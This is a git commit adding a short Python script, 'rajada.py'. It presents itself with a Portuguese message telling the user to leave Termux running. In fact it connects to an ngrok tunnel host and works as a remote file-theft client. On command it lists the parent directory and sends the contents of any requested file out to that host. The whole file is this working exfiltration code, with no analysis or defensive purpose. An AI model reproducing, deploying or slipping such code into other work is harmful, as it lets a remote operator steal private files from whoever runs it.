05c3fa0f2c59ba8b5316ee182f448b67d3fa6331
m7codee <104729995+m7codee@users.noreply.github.com>
2022-10-23 15:50:29 -0300

    Add files via upload

---
+++ rajada.py
@@ -0,0 +1,43 @@
+# HOST="1.tcp.ngrok.io" PORT=12345 python client.py
+
+import os
+import socket
+from os import chdir, getcwd, listdir
+from os.path import isfile
+print("Rajada melhorada, deixe o termux rodando e vai rajar")
+host = '0.tcp.sa.ngrok.io'
+port = 19018
+
+# Create a TCP socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+chdir('..')
+# Connect to the server with the socket via our ngrok tunnel
+server_address = (host, port)
+sock.connect(server_address)
+
+message = 'bixaXXXXXXXXXXX'
+data_received = 0
+data_expected = len(message)
+
+while data_received < data_expected:
+    data = sock.recv(1024)
+    data_received += len(data)
+    # print("Received: {}".format(data.decode("utf-8")))
+    for c in listdir():
+        if data.decode("utf-8") == 'x':
+            sock.send(f'{c}  \n '.encode())
+        else:
+            t = open(data.decode("utf-8"), 'rb')
+            msm = t.read()
+
+            sock.send(msm)
+
+
+# sock.close()
+
+# Send the message
+# Await a response
+
+sock.close()
